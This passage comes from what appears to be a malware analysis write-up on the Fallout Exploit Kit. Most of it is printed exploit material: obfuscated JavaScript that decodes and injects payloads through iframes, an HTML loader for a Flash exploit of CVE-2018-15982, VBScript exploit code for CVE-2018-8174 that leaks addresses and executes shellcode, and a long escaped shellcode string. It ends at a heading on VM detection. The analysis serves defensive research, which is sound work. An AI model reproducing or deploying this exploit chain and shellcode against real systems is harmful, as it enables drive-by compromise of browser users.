<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">lIlll1IIlI</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1I1l1</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlll1IIlI</span><span class="dl">'</span><span class="p">],</span><span class="mi">16</span><span class="p">);</span>

<span class="c1">// str_G2 =&gt; str_F2.modPow(str_C2, str_D2)</span>
<span class="kd">var</span> <span class="nx">llIIlI</span> <span class="o">=</span> <span class="nx">lIlll1IIlI</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll11IIl</span><span class="dl">'</span><span class="p">](</span><span class="nx">ll1l1IlIIIll</span><span class="p">,</span><span class="nx">lll1II</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">I1Il1I1</span> <span class="o">=</span> <span class="nx">llIIlI</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">IIIIlI1IllII</span> <span class="o">=</span> <span class="mi">32</span> <span class="o">-</span> <span class="nx">I1Il1I1</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
<span class="k">while</span><span class="p">(</span><span class="nx">IIIIlI1IllII</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">I1Il1I1</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">0</span><span class="dl">'</span><span class="o">+</span><span class="nx">I1Il1I1</span><span class="p">;</span>
    <span class="nx">IIIIlI1IllII</span><span class="o">--</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">var</span> <span class="nx">II1ll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1lI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">ll1llI1</span><span class="dl">'</span><span class="p">](</span><span class="nx">I1Il1I1</span><span class="p">);</span>       <span class="c1">// str_G2</span>
<span class="kd">var</span> <span class="nx">lI1lIl1Ill</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1lI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">ll1llI1</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1ll1</span><span class="p">);</span>    <span class="c1">// str_A2</span>

<span class="c1">// aes_decrypt()</span>
<span class="kd">var</span> <span class="nx">I1II111I1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">l1I1l1</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIIIIllIl1</span><span class="dl">'</span><span class="p">],</span>       <span class="c1">// enc_data_1</span>
    <span class="nx">II1ll</span><span class="p">,</span>                      <span class="c1">// str_G2</span>
    <span class="p">{</span><span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nx">lI1lIl1Ill</span><span class="p">}</span>    <span class="c1">// str_A2</span>
<span class="p">);</span>

<span class="kd">var</span> <span class="nx">IIIIl</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">l1I1l1</span><span class="p">[</span><span class="dl">'</span><span class="s1">II11lIl11</span><span class="dl">'</span><span class="p">],</span>        <span class="c1">// enc_data_2</span>
    <span class="nx">II1ll</span><span class="p">,</span>                      <span class="c1">// str_G2</span>
    <span class="p">{</span><span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nx">lI1lIl1Ill</span><span class="p">}</span>    <span class="c1">// str_A2</span>
<span class="p">);</span>
</code></pre></div></div>

<p>The data thus decoded is written to Body and executed. The decoded data is the CVE-2018-8174 exploit code and the CVE-2018-15982 exploit code for reading swf loader.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nx">IlIII1lll</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
	<span class="kd">var</span> <span class="nx">IIlIl</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">createElement</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
	<span class="nx">IIlIl</span><span class="p">[</span><span class="dl">'</span><span class="s1">setAttribute</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">IlIlll1I1</span><span class="dl">"</span><span class="p">);</span>
	<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementsByTagName</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">BODY</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">IIlIl</span><span class="p">);</span>
	<span class="kd">var</span> <span class="nx">I11I11IIlIII</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementById</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">IlIlll1I1</span><span class="dl">"</span><span class="p">)[</span><span class="dl">'</span><span class="s1">contentWindow</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">];</span>
	<span class="nx">I11I11IIlIII</span><span class="p">[</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">]();</span>
	<span class="nx">I11I11IIlIII</span><span class="p">[</span><span class="dl">'</span><span class="s1">write</span><span class="dl">'</span><span class="p">](</span><span class="nx">IlIII1lll</span><span class="p">);</span>
	<span class="nx">I11I11IIlIII</span><span class="p">[</span><span class="dl">'</span><span class="s1">close</span><span class="dl">'</span><span class="p">]();</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nx">lIl1l1I</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">l1III11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">createElement</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">l1III11</span><span class="p">[</span><span class="dl">'</span><span class="s1">setAttribute</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">lII1I1IlI1I</span><span class="dl">"</span><span class="p">);</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementsByTagName</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">BODY</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">l1III11</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">llIll1lI</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementById</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">lII1I1IlI1I</span><span class="dl">"</span><span class="p">)[</span><span class="dl">'</span><span class="s1">contentWindow</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">];</span>
    <span class="nx">llIll1lI</span><span class="p">[</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">]();</span>
    <span class="nx">llIll1lI</span><span class="p">[</span><span class="dl">'</span><span class="s1">write</span><span class="dl">'</span><span class="p">](</span><span class="nx">lIl1l1I</span><span class="p">);</span>
    <span class="nx">llIll1lI</span><span class="p">[</span><span class="dl">'</span><span class="s1">close</span><span class="dl">'</span><span class="p">]();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>For swf loader, the following code is executed.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"x-ua-compatible"</span> <span class="na">content=</span><span class="s">"IE=10"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"BnjJbx"</span><span class="nt">&gt;&lt;object</span> <span class="na">classid=</span><span class="s">"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"</span> <span class="na">width=</span><span class="s">"205"</span> <span class="na">height=</span><span class="s">"528"</span> <span class="na">id=</span><span class="s">"BnjJbx"</span> <span class="na">align=</span><span class="s">"middle"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"movie"</span> <span class="na">value=</span><span class="s">"/24_02_1964/05_04_1933/3410-Skegger-12666"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"quality"</span> <span class="na">value=</span><span class="s">"high"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"bgcolor"</span> <span class="na">value=</span><span class="s">"#ffffff"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"play"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"loop"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"wmode"</span> <span class="na">value=</span><span class="s">"window"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"scale"</span> <span class="na">value=</span><span class="s">"showall"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"menu"</span> <span class="na">value=</span><span class="s">"false"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"devicefont"</span> <span class="na">value=</span><span class="s">"false"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"salign"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"allowScriptAccess"</span> <span class="na">value=</span><span class="s">"sameDomain"</span> <span class="nt">/&gt;&lt;/object&gt;&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>Thus, the swf file that exploits CVE-2018-15982 is read and executed.</p>

<h2 id="cve-2018-8174">CVE-2018-8174</h2>
<p>The exploit code used is very similar to PoC.</p>

<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Sub</span> <span class="nf">StartExploit</span>
	<span class="n">UAF</span>
	<span class="n">InitObjects</span>
	<span class="n">vb_adrr</span><span class="o">=</span><span class="n">LeakVBAddr</span><span class="p">()</span>
	<span class="n">vbs_base</span><span class="o">=</span><span class="n">GetBaseByDOSmodeSearch</span><span class="p">(</span><span class="n">GetUint32</span><span class="p">(</span><span class="n">vb_adrr</span><span class="p">))</span>
	<span class="n">msv_base</span><span class="o">=</span><span class="n">GetBaseFromImport</span><span class="p">(</span><span class="n">vbs_base</span><span class="p">,</span><span class="s">"msvcrt.dll"</span><span class="p">)</span>
	<span class="n">krb_base</span><span class="o">=</span><span class="n">GetBaseFromImport</span><span class="p">(</span><span class="n">msv_base</span><span class="p">,</span><span class="s">"kernelbase.dll"</span><span class="p">)</span>
	<span class="n">ntd_base</span><span class="o">=</span><span class="n">GetBaseFromImport</span><span class="p">(</span><span class="n">msv_base</span><span class="p">,</span><span class="s">"ntdll.dll"</span><span class="p">)</span>
	<span class="n">VirtualProtectAddr</span><span class="o">=</span><span class="n">GetProcAddr</span><span class="p">(</span><span class="n">krb_base</span><span class="p">,</span><span class="s">"VirtualProtect"</span><span class="p">)</span>
	<span class="n">NtContinueAddr</span><span class="o">=</span><span class="n">GetProcAddr</span><span class="p">(</span><span class="n">ntd_base</span><span class="p">,</span><span class="s">"NtContinue"</span><span class="p">)</span>
	<span class="n">SetMemValue</span> <span class="n">GetShellcode</span><span class="p">()</span>
	<span class="n">ShellcodeAddr</span><span class="o">=</span><span class="n">GetMemValue</span><span class="p">()</span><span class="o">+</span><span class="mi">8</span>
	<span class="n">SetMemValue</span> <span class="n">WrapShellcodeWithNtContinueContext</span><span class="p">(</span><span class="n">ShellcodeAddr</span><span class="p">)</span>
	<span class="n">lIlll</span><span class="o">=</span><span class="n">GetMemValue</span><span class="p">()</span><span class="o">+</span><span class="mi">69596</span>
	<span class="n">SetMemValue</span> <span class="n">ExpandWithVirtualProtect</span><span class="p">(</span><span class="n">lIlll</span><span class="p">)</span>
	<span class="n">llIIll</span><span class="o">=</span><span class="n">GetMemValue</span><span class="p">()</span>
	<span class="n">ExecuteShellcode</span>
<span class="k">End</span> <span class="k">Sub</span>
<span class="n">StartExploit</span>
</code></pre></div></div>

<p>The process to generate shellcode is like this.</p>

<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Function</span> <span class="nf">GetShellcode</span><span class="p">()</span>
	<span class="n">IIlI</span><span class="o">=</span><span class="n">Unescape</span><span class="p">(</span><span class="s">"%u0000%u0000%u0000%u0000"</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">Unescape</span><span class="p">(</span><span class="s">"%u8B55%u83EC%uF8E4%uEC81%u00CC%u0000%u5653%uE857%u08B0%u0000%uF08B%u44C7%u1824%u05CD%u5379%u848D%uB024%u0000%u8900%u2474%u8934%u2444%u8D14%u2454%u8D10%u2444%uC744%u2444%u1D1C%u2BDE%u8982%u2444%u8D10%u244C%u8D14%u2484%u0094%u0000%u4489%u2824%u448D%u1824%u8D50%u2444%u502C%u1EE8%u0006%u8B00%u245C%u8D18%u244C%u8B18%u247C%u8B1C%u8903%u2444%u8B40%u1C47%u4489%u4424%u478B%u8920%u2444%u3348%u89C0%u2444%u8918%u2444%u891C%u2444%uE834%u02E9%u0000%u548D%u1C24%uCF8B%u66E8%u0002%u8300%u2464%u0038%u4C8D%u2024%u406A%uE856%u02FE%u0000%uC683%u8D40%u244C%u6828%u0080%u0000%uE856%u02EC%u0000%u74FF%u2C24%u4C8B%u5024%u448D%u4824%u74FF%u2C24%uD68B%u74FF%u4824%u5753%u8D50%u2444%u5060%u448D%u4C24%uE850%u0389%u0000%uDB33%uC483%u3938%u245C%u742C%u8B41%u2474%u8D38%u2444%u6A48%u5F44%u5357%uFF50%u83D6%u0CC4%u7C89%u4824%u448D%u1824%u106A%u5053%uD6FF%uC483%u8D0C%u2444%u5018%u448D%u4C24%u5350%u6853%u0000%u0800%u5353%uFF53%u2474%u5350%u54FF%u6424%uFF53%u2454%u5F44%u5B5E%uE58B%uC35D%u8B55%u83EC%u0CEC%u458B%u890C%uF445%u458B%u8908%uF845%u6583%u00FC%u07EB%u458B%u40FC%u4589%u8BFC%uFC45%u453B%u7310%u8B12%uF845%u4503%u8BFC%uF44D%u4D03%u8AFC%u8809%uEB08%uC9DF%u55C3%uEC8B%u458B%u0F08%u00BE%uC085%u2D74%u458B%u0F08%u00BE%uF883%u7C41%u8B19%u0845%uBE0F%u8300%u5AF8%u0E7F%u458B%u0F08%u00BE%uC083%u8B20%u084D%u0188%u458B%u4008%u4589%uEB08%u5DC9%u55C3%uEC8B%u8B51%u0845%u4589%uEBFC%u8B07%uFC45%u8940%uFC45%u458B%u0FFC%u00BE%uC085%u0274%uEDEB%u458B%u2BFC%u0845%uC3C9%u5653%u8B57%u33D9%u53FF%u3347%uE8F6%uFFC9%uFFFF%u8B59%u85C8%u74C9%u0F24%u03B6%uD233%uC703%uF1BF%u00FF%uF700%u43F7%uFA8B%uD233%u048D%uBE3E%uFFF1%u0000%uF6F7%uF28B%uE983%u7501%uC1DC%u10E6%u048D%u5F37%u5B5E%u55C3%uEC8B%uEC83%u5310%u5756%uF98B%u5589%u33FC%u8BF6%u3C47%u5C8B%u7838%uDF03%u438B%u8B1C%u204B%uC703%u4589%u03F0%u8BCF%u2443%uC703%u4D89%u89F8%uF445%u7339%u7618%u8B18%uB10C%uCF03%u7BE8%uFFFF%u3BFF%uFC45%u1074%u4D8B%u46F8%u733B%u7218%u33E8%u5FC0%u5B5E%uC3C9%u458B%u8BF4%uF04D%uB70F%u7004%u048B%u0381%uEBC7%u64EA%u30A1%u0000%u8B00%u0C40%u408B%u8B14%u8B00%u8B00%u1040%u64C3%u30A1%u0000%u8B00%u0C40%u408B%u8B14%u8B00%u1040%u56C3%u8B57%u8BF9%u56F2%u078B%uD0FF%uC085%u0675%u478B%u5604%uD0FF%u5E5F%u56C3%uF18B%uE856%uFEAB%uFFFF%u8B59%uE8CE%uFF06%uFFFF%u3D5E%u06DE%u3F54%u1F74%u413D%uCD05%u7425%u3D18%u0309%u0F05%u1174%uEC3D%u1803%u7416%u3D0A%u044B%u19F3%u0374%uC033%u33C3%u40C0%u55C3%uEC8B%uEC81%u013C%u0000%u418B%u5308%u5756%uFA8B%uDB33%u518B%u890C%uF855%u518B%u8B10%u1449%u6A53%u8902%uFC55%u4D89%uFFF4%u8BD0%u83F0%uFFFE%u4074%u858D%uFEC8%uFFFF%u85C7%uFEC8%uFFFF%u0128%u0000%u5650%u55FF%u85F8%u74C0%u8D27%uEC8D%uFFFE%uE8FF%uFF6F%uFFFF%uC085%u1575%u858D%uFEC8%uFFFF%u5650%u55FF%u85FC%u75C0%u56E2%u55FF%uEBF4%u3303%u43DB%u1F89%u5E5F%uC95B%u55C3%uEC8B%uEC83%u5310%u5756%uC033%uF98B%u3340%u53C9%uA20F%uF38B%u8D5B%uF05D%u0389%u7389%u8904%u084B%u5389%u8B0C%uF845%uE8C1%u891F%u5F07%u5B5E%uC3C9%u8B55%u81EC%u04EC%u0001%u5300%u3356%u57F6%uC68B%u8488%uFC05%uFFFE%u40FF%u003D%u0001%u7200%u8BF1%u8BDE%u8BFE%u8AF1%u3D94%uFEFC%uFFFF%uC78B%uE083%u0F07%uCAB6%uB60F%u3004%uC303%uC803%uB60F%u8AD9%u1D84%uFEFC%uFFFF%u8488%uFC3D%uFFFE%u47FF%u9488%uFC1D%uFFFE%u81FF%u00FF%u0001%u7200%u8BC8%u0C7D%uF633%uDE8B%uFF85%u5574%u458B%u8908%u0C45%u438D%u0F01%uD8B6%u948A%uFC1D%uFFFE%u0FFF%uC2B6%uC603%uB60F%u8AF0%u3584%uFEFC%uFFFF%u8488%uFC1D%uFFFE%u88FF%u3594%uFEFC%uFFFF%uB60F%u1D8C%uFEFC%uFFFF%uB60F%u03C2%u8BC8%u0C45%uB60F%u8AC9%u0D8C%uFEFC%uFFFF%u0830%u8940%u0C45%uEF83%u7501%u8BB1%u0845%u5E5F%uC95B%u55C3%uEC8B%uEC83%u8B48%u1C45%u4D89%u53F4%u8B56%u8B08%u0870%u4D89%u8BF8%u0448%u4D89%u8BF0%u0C48%u4D89%u8BE8%u1048%u4D89%u8BE0%u1448%u4D89%u8BD8%u1848%u458B%u5714%u046A%u5589%u8BEC%u1850%u4D89%u8BC8%u2448%u458B%u6818%u1000%u0000%u046A%u006A%u388B%u5589%u89D4%uFC4D%u7D89%uFFD0%u6AD2%u8B04%u6AD8%u5300%u5D89%uFFE4%u83D7%u207D%u8D00%u1445%u046A%u5350%u1875%u7D83%u0024%u0975%u45C7%uC614%u90EA%uEB2A%uC71D%u1445%uF9D7%u2A90%u14EB%u7D83%u0024%u45C7%uD214%u90EB%u752A%uC707%u1445%uE4D2%u2A90%u29E8%uFFFC%u8BFF%u084D%u458D%u83C0%u0CC4%u45C7%uF4C0%uDBBC%uC770%uC445%uE14D%u1989%u086A%uE850%uFE76%uFFFF%u5959%uDB33%u458D%u53C0%u5353%u5053%u55FF%u8BF8%u85F8%u75FF%u8B0A%u1045%u1889%u23E9%u0001%u5300%u6A53%u5303%u6853%u01BB%u0000%u75FF%u57F4%u55FF%u8BF0%u89D8%u145D%uDB85%u840F%u00FB%u0000%u4D8B%u8D08%uB845%u086A%uC750%uB845%uC6E5%u1DB0%u45C7%u7CBC%uB9D1%uE819%uFE1C%uFFFF%u5959%uC033%u6850%u3000%u8080%u5050%uFF50%uEC75%u458D%u50B8%uFF53%uE855%uD88B%uDB85%u840F%u00B8%u0000%u046A%u75FF%u6AE4%u6A00%u5300%u55FF%u85E0%u0FC0%uA084%u0000%u8300%u1C65%u8D00%uDC45%u6583%u00DC%u8D50%u1845%u45C7%u0418%u0000%u5000%u458D%u501C%u0568%u0000%u5320%u55FF%u83D8%u187D%u7400%u8376%u1C7D%u7400%u6A70%u6804%u1000%u0000%u75FF%u6A1C%uFF00%uD455%u75FF%u8B1C%u0C4D%u006A%u8950%uFF01%uD055%u6583%u00CC%u458D%u50CC%u458B%uFF0C%u1C75%u30FF%uFF53%uC855%uFF53%uFFD6%u1475%uD6FF%uFF57%u83D6%u207D%u8B00%uFC75%u0474%u006A%uD6FF%u7D83%u0024%u0474%u006A%uD6FF%u458B%uFF0C%u1C75%u4D8B%uFF08%uE830%uFD52%uFFFF%u458B%u5910%uC759%u0100%u0000%uEB00%u5311%uD6FF%u75FF%uFF14%u57D6%uD6FF%u458B%u8310%u0020%u5E5F%uC95B%u55C3%uEC8B%uEC83%u5310%u8B56%u8BF1%u57DA%u7589%uE8FC%uFBF7%uFFFF%uF88B%u43BA%u1C04%u8B19%uE8CF%uFB83%uFFFF%u368B%u75BA%uB905%u8B28%u89CF%u1446%u72E8%uFFFB%u8BFF%uFC75%u51BA%u3209%u8B73%u890E%u1C41%uCF8B%u5EE8%uFFFB%u8BFF%uBA0E%u0614%u33F5%u4189%u8B08%uE8CF%uFB4D%uFFFF%u0E8B%u97BA%u8104%u891D%u8B01%uE8CF%uFB3D%uFFFF%u0E8B%u4DBA%u8505%u8927%u0441%uCF8B%u2CE8%uFFFB%u8BFF%uBA0E%u04E4%u2259%u4189%u8B0C%uE8CF%uFB1B%uFFFF%u0E8B%uD3BA%u7004%u891F%u1041%uCF8B%u0AE8%uFFFB%u8BFF%uBA0E%u047A%u1A1E%u4189%u8B18%uE8CF%uFAF9%uFFFF%u0E8B%uF3BA%u8503%u8915%u2041%uCF8B%uE8E8%uFFFA%u8BFF%u890E%u2441%u58E8%uFFFB%uBAFF%u028C%u08D8%uC88B%uD2E8%uFFFA%u8BFF%u6A0B%u890C%u8D01%uF045%u4D8B%u500C%u45C7%uC2F0%u8DE0%uC720%uF445%uB412%u37CD%u45C7%uEFF8%uF16B%uE8A4%uFC34%uFFFF%u5959%u0E8B%u558D%uE8F0%uFB2B%uFFFF%uF88B%u5DBA%u1006%u8B36%uE8CF%uFA91%uFFFF%u758B%uBA08%u0584%u29FB%u0E8B%u4189%u8B0C%uE8CF%uFA7D%uFFFF%u0E8B%u55BA%uC706%u8935%u1441%uCF8B%u6CE8%uFFFA%u8BFF%uBA0E%u078C%u4B92%u4189%u8B10%uE8CF%uFA5B%uFFFF%u0E8B%u55BA%u6406%u8936%u0841%uCF8B%u4AE8%uFFFA%u8BFF%uBA0E%u051D%u245C%u4189%u8B04%uE8CF%uFA39%uFFFF%u0E8B%u46BA%uC006%u8935%u8B01%uE8CF%uFA29%uFFFF%u0E8B%u5E5F%u895B%u1841%uC3C9%uECD7%u2182%uA319%u2DD6%u29FE%uCBFE%u5CE9%uB27D%u501A%uCF26%u6A47%u54FE%uDABA%u8A85%uEF83%u3361%u09D1%u20F7%u16EC%uD9B7%u917A%uDE1A%u2281%uEA7F%u3143%u6ACE%u1A52%u4FF4%u500B%uC276%u5A57%uC1F8%uE09A%u258F%uA209%u6BCD%u28EE%uE3E7%u2FD5%u8D28%u3568%uAE4A%u0623%u309B%u8E87%uE4E0%u8EF7%u5F02%u7AB4%u73DA%u7483%uB0D2%uBC0E%uB049%u40EE%u8610%u7665%u07AF%u7330%u3C80%u6436%uF745%u5A61%uC1F8%uBBE2%u5581%uF71D%u00A7%u7F8D%u4907%u11AF%uB565%uF4E6%u755E%u19EE%u23AF%u8DB6%uEB89%u2838%u11BF%uC109%u1219%uD17E%uBEEA%uDD49%uF759%u09D6%uEA08%u8E45%uB602%u1B93%u19C4%u9146%uB94D%u9E6C%u0BC7%u00E8%u0000%u5800%uE883%u2D05%u00C0%u0000%u00C3"</span> <span class="o">&amp;</span><span class="n">lIIII</span><span class="p">(</span><span class="n">IIIII</span><span class="p">(</span><span class="s">""</span><span class="p">)))</span>
	<span class="n">IIlI</span><span class="o">=</span><span class="n">IIlI</span> <span class="o">&amp;</span> <span class="kt">String</span><span class="p">((</span><span class="o">&amp;</span><span class="n">h80000</span><span class="o">-</span><span class="n">LenB</span><span class="p">(</span><span class="n">IIlI</span><span class="p">))</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span><span class="n">Unescape</span><span class="p">(</span><span class="s">"%u4141"</span><span class="p">))</span>
	<span class="n">GetShellcode</span><span class="o">=</span><span class="n">IIlI</span>
<span class="k">End</span> <span class="k">Function</span>
</code></pre></div></div>

<p>Let’s read shellcode.</p>

<h2 id="shellcode">Shellcode</h2>
<p>The decoding algorithm in the shellcode has not changed from v3 and remains RC4.
<a href="https://nao-sec.org/2019/03/analysis-of-fallout-exploit-kit-v3.html">Analysis of Fallout Exploit Kit v3</a></p>

<p>The hash algorithm of API hash has not changed either.
API hashed by the dualaccModFFF1Hash algorithm.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__thiscall</span> <span class="nf">dualaccModFFF1Hash</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="n">this</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// ebx</span>
  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// edi</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// esi</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// ecx</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// edx</span>

  <span class="n">v1</span> <span class="o">=</span> <span class="n">this</span><span class="p">;</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">zz_count</span><span class="p">(</span><span class="n">this</span><span class="p">);</span> <span class="n">i</span><span class="p">;</span> <span class="o">--</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="n">v2</span> <span class="o">+</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="n">v1</span><span class="o">++</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0xFFF1</span><span class="p">;</span>
    <span class="n">v2</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
    <span class="n">v3</span> <span class="o">=</span> <span class="p">(</span><span class="n">v3</span> <span class="o">+</span> <span class="n">v5</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0xFFF1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v2</span> <span class="o">+</span> <span class="p">(</span><span class="n">v3</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>However, there were interesting changes.
Analysis environment detection codes has been added in shellcode.</p>

<h3 id="vm-detection">VM Detection</h3>

<p>Query hypervisor precense using CPUID.</p>

